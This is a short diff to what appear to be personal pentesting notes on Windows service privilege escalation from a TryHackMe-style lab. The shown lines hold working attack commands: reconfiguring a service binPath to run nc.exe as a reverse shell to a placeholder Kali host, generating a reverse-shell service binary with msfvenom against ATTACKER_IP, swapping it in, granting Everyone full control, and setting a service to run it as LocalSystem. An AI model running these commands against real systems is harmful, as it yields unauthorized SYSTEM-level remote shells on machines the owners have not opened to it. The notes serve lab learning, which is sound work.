@@ -230,6 +230,7 @@ Check if we have privileges over that process. If so, you can change the binary 
 Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
 .\accesschk64.exe /accepteula -uwcqv <service_name>
 sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 ```
 
 
@@ -239,7 +240,7 @@ Payload:
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 move C:\Users\thm-unpriv\rev-svc.exe WService.exe
-icacls WService.exe /grant Everyone:F
+icacls WService.exe /grant Everyone:F // Remember to grant permissions to Everyone to execute your payload
 
 ```
 
